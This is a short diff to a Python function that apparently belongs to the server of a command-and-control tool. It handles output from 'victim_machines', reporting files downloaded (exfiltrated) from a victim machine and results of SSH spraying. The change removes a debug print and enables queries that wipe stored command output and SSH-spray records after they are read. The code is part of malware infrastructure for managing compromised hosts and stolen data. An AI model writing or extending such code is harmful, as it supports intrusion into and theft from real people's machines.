@@ -68,7 +68,6 @@ def getoutput( id ):
 			#append all entries for downloaded files
 			for key1, value1 in record_data["exfiltrate"].items():
 				for key2, value2 in filename_data[key1].items():
-					print(key1, value1, key2, value2)
 					if value2 == "0":
 						output_string = "There was an error in downloading \"" + str(value1) + "\" from the victim machine."
 					if value2 == "1":
@@ -104,10 +103,10 @@ def getoutput( id ):
 			file.close()
 #			print(json.dumps(json_data, indent=2))
 
-#			cleanup_query1 = """ UPDATE victim_machines SET command_output = 'e30=' WHERE victim_id =%s """
-#			cleanup_query2 = """ UPDATE victim_machines SET sshspray = '' WHERE victim_id = %s """
-#			cursor.execute(cleanup_query1,data)
-#			cursor.execute(cleanup_query2,data)
+			cleanup_query1 = """ UPDATE victim_machines SET command_output = 'e30=' WHERE victim_id =%s """
+			cleanup_query2 = """ UPDATE victim_machines SET sshspray = '' WHERE victim_id = %s """
+			cursor.execute(cleanup_query1,data)
+			cursor.execute(cleanup_query2,data)
 
 		else:
 			print("id not found in the database, try again")
